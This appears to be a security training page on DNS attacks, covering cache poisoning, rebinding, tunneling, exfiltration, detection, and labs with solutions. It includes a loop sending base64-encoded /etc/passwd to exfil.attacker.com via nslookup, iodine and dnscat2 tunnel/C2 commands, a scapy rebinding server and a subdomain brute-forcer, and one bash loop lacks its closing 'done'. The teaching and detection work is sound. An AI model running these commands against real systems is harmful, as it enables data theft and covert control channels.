DNS

DNS Protocol

  • Operates on UDP port 53 (queries) and TCP port 53 (zone transfers, large responses)
  • Hierarchical, distributed naming system — translates domain names to IP addresses
  • DNS hierarchy: Root (.) → TLD (.com) → Authoritative (example.com)
  • Responses are cached at multiple levels (browser, OS resolver, recursive resolver)
  • DNS is unencrypted by default — queries/responses visible to anyone on the path

DNS Resolution Flow

# Recursive resolution path:
# 1. Client checks local cache (/etc/hosts, OS cache)
# 2. Query sent to recursive resolver (ISP or configured DNS like 8.8.8.8)
# 3. Resolver queries root nameserver → gets TLD NS referral
# 4. Resolver queries TLD nameserver (.com) → gets authoritative NS referral
# 5. Resolver queries authoritative nameserver → gets final answer
# 6. Answer cached at resolver (respects TTL) and returned to client

# Iterative vs Recursive:
#   Recursive  — resolver does all the work, client gets final answer
#   Iterative  — each server refers to the next, client follows the chain

DNS over HTTPS (DoH) / DNS over TLS (DoT)

  • DoT — DNS queries encrypted with TLS, port 853. Easy to block (distinct port).
  • DoH — DNS queries sent as HTTPS requests to port 443. Hard to distinguish from normal web traffic.
  • Both prevent eavesdropping/tampering of DNS queries in transit
  • Red team note: DoH can be used for covert C2 channels since it blends with HTTPS traffic
# Query via DoH with curl
curl -s "https://dns.google/resolve?name=example.com&type=A" | python3 -m json.tool

# Using kdig (knot-dns-utils)
kdig -d @8.8.8.8 +tls-ca example.com       # DoT
kdig -d @8.8.8.8 +https example.com         # DoH

DNS Cache Poisoning

  • Attacker injects forged DNS responses into a resolver's cache
  • Victims querying the poisoned resolver get redirected to attacker-controlled IPs
  • Kaminsky attack: Flood resolver with spoofed responses for a random subdomain, include a malicious NS record in the authority section to hijack the entire zone
  • Mitigations: DNSSEC (cryptographic signatures), source port randomization, 0x20 encoding (mixed case query names), response rate limiting
# Check if resolver is vulnerable to cache poisoning
# Low source port entropy = vulnerable
dig +short porttest.dns-oarc.net TXT @target-resolver
# Result: "x.x.x.x is GOOD/POOR: 26 queries in y seconds from z ports"

# DNSSEC validation check
dig example.com +dnssec +short
dig . DNSKEY +short    # Root zone DNSSEC keys

DNS Rebinding

  • Bypass same-origin policy by manipulating DNS TTL
  • Step 1: Victim visits attacker's domain (e.g., evil.com) which resolves to attacker IP
  • Step 2: JavaScript loaded. DNS TTL set very low (e.g., 0 or 1 second)
  • Step 3: Attacker's DNS server re-binds evil.com to an internal IP (e.g., 192.168.1.1)
  • Step 4: Subsequent JS requests to evil.com now hit the internal service — browser thinks it's same-origin
  • Used to access internal services (routers, cloud metadata at 169.254.169.254, etc.)

DNS Tunneling & Exfiltration

  • Encapsulate arbitrary data inside DNS queries/responses to bypass firewalls
  • Works because DNS traffic is almost never blocked — even restrictive networks allow it
  • Data encoded in subdomain labels: dGVzdA.exfil.attacker.com (base32/base64/hex encoded)
  • Attacker controls the authoritative NS for attacker.com → receives all queries for subdomains

Exfiltration

# Manual DNS exfiltration — encode data in subdomain queries
# On target (victim):
data=$(cat /etc/passwd | base64 -w 0)
# Split into 63-char labels (DNS label max length)
echo "$data" | fold -w 63 | while read chunk; do
  nslookup "$chunk.exfil.attacker.com"
done

# On attacker: run tcpdump or custom DNS server to capture incoming queries
sudo tcpdump -i eth0 -n port 53 | grep exfil

Tunneling Tools

# iodine — IP-over-DNS tunnel (full network tunnel)
# Server (attacker, must be authoritative NS for tunnel domain)
sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client (victim/target)
sudo iodine -f -P password tunnel.attacker.com
# Creates a tun0 interface — route traffic through it

# dnscat2 — C2 channel over DNS
# Server
ruby dnscat2.rb tunnel.attacker.com

# Client
./dnscat tunnel.attacker.com

# DNScat2 gives you a command shell, file upload/download, port forwarding

Detection

# Signs of DNS tunneling:
# - Unusually long subdomain labels (close to 63 char max)
# - High volume of DNS queries to a single domain
# - TXT record responses with large payloads
# - High entropy in subdomain names (base64/hex encoded data)
# - Uncommon record types (NULL, PRIVATE)

# Quick detection with query length analysis
tcpdump -i eth0 -nn port 53 -l | awk '{print length, $0}' | sort -rn | head

Lab 5: DNS Rebinding Attack

Hard

Objective: Set up a DNS rebinding attack that initially resolves to your server, then switches to 127.0.0.1 to bypass same-origin restrictions.

# Minimal DNS server that alternates between external and internal IPs
from scapy.all import *
import threading

external_ip = "YOUR_SERVER_IP"
internal_ip = "127.0.0.1"
request_count = {}

def dns_responder(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        count = request_count.get(qname, 0)
        request_count[qname] = count + 1

        # First request → external (loads attacker page)
        # Second request → internal (bypasses SOP)
        rdata = external_ip if count == 0 else internal_ip

        resp = IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / \
               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                   an=DNSRR(rrname=qname, rdata=rdata, ttl=0))  # TTL=0 forces re-query
        send(resp, verbose=0)
        print(f"[+] {qname} → {rdata} (request #{count+1})")

sniff(filter="udp port 53", prn=dns_responder, store=0)

Lab 6: Subdomain Brute Force Script

Medium

Objective: Write a multi-threaded subdomain brute-forcer from scratch using Python's dns.resolver module.

#!/usr/bin/env python3
import dns.resolver
import threading
from queue import Queue
import sys

domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
threads = 50
found = []
lock = threading.Lock()
q = Queue()

def worker():
    resolver = dns.resolver.Resolver()
    resolver.timeout = 2
    resolver.lifetime = 2
    while not q.empty():
        sub = q.get()
        fqdn = f"{sub}.{domain}"
        try:
            answers = resolver.resolve(fqdn, "A")
            ips = [str(r) for r in answers]
            with lock:
                found.append((fqdn, ips))
                print(f"[+] {fqdn} → {', '.join(ips)}")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.resolver.NoNameservers, dns.exception.Timeout):
            pass
        q.task_done()

with open(wordlist) as f:
    for line in f:
        q.put(line.strip())

print(f"[*] Brute-forcing {domain} with {q.qsize()} words, {threads} threads")
for _ in range(threads):
    threading.Thread(target=worker, daemon=True).start()
q.join()
print(f"\n[+] Found {len(found)} subdomains")

# Measure amplification factor for different query types
for qtype in ANY TXT NS MX SOA DNSKEY; do
  QSIZE=$(dig +noall +answer +stats $qtype example.com | grep "MSG SIZE" | awk '{print $NF}')
  echo "$qtype response size: $QSIZE bytes"

# A typical query is ~40 bytes; ANY response can be 2000+
# Amplification factor = response_size / query_size
from scapy.all import *

# Analyze amplification pcap
pkts = rdpcap("dns_amplification.pcap")

queries = [p for p in pkts if p.haslayer(DNS) and p[DNS].qr == 0]
responses = [p for p in pkts if p.haslayer(DNS) and p[DNS].qr == 1]

total_q = sum(len(p) for p in queries)
total_r = sum(len(p) for p in responses)
print(f"Query traffic:    {total_q} bytes ({len(queries)} packets)")
print(f"Response traffic: {total_r} bytes ({len(responses)} packets)")
print(f"Amplification:    {total_r/total_q:.1f}x")

# Identify the spoofed victim (destination of all responses)
from collections import Counter
victims = Counter(p[IP].dst for p in responses)
print(f"Target victim:    {victims.most_common(1)[0]}")

Challenge 3: Exfil Decoder

Hard

You've captured a pcap of DNS traffic from a compromised host. The attacker exfiltrated a file using DNS queries. Decode the exfiltrated data from the captured DNS queries to recover the flag.

Approach
  • Extract DNS queries from the pcap — look for queries to the attacker's domain
  • The data is encoded in the subdomain labels (hex or base64)
  • Reassemble the chunks in order, decode, and recover the original file
Solution
# Extract DNS queries from pcap with tshark
tshark -r exfil.pcap -Y "dns.qr == 0" -T fields -e dns.qry.name | \
  grep "\.exfil\.attacker\.com" | sort -u > queries.txt

# Preview the extracted queries
head queries.txt
# Example output:
# 0.48656c6c6f.exfil.attacker.com
# 1.576f726c64.exfil.attacker.com
# 2.466c6167.exfil.attacker.com
#!/usr/bin/env python3
"""Decode DNS exfiltration from extracted queries"""
import sys

queries_file = "queries.txt"
exfil_domain = ".exfil.attacker.com"

chunks = {}

with open(queries_file) as f:
    for line in f:
        line = line.strip()
        # Remove the exfil domain suffix
        subdomain = line.replace(exfil_domain, "")
        parts = subdomain.split(".")

        # Format: sequence_number.hex_encoded_data
        if len(parts) >= 2:
            try:
                seq = int(parts[0])
                data = parts[1]
                chunks[seq] = data
            except ValueError:
                continue

# Reassemble in order
ordered = [chunks[k] for k in sorted(chunks.keys())]
hex_data = "".join(ordered)

# Decode from hex
try:
    plaintext = bytes.fromhex(hex_data).decode("utf-8", errors="replace")
    print(f"[+] Decoded data:\n{plaintext}")
except ValueError:
    # Try base64 instead
    import base64
    plaintext = base64.b64decode(hex_data).decode("utf-8", errors="replace")
    print(f"[+] Decoded (base64):\n{plaintext}")
# Alternative: one-liner with tshark + python
tshark -r exfil.pcap -Y "dns.qr == 0 and dns.qry.name contains exfil" \
  -T fields -e dns.qry.name | \
  sed "s/\.exfil\.attacker\.com//" | \
  sort -t. -k1 -n | \
  cut -d. -f2 | \
  tr -d '\n' | \
  python3 -c "import sys; print(bytes.fromhex(sys.stdin.read()).decode())"

Hint: The first label in each subdomain is the sequence number (for reassembly order). The second label is hex-encoded data. Filter tshark output for queries only (dns.qr == 0), strip the exfil domain, sort by sequence number, concatenate the hex chunks, and decode with bytes.fromhex().
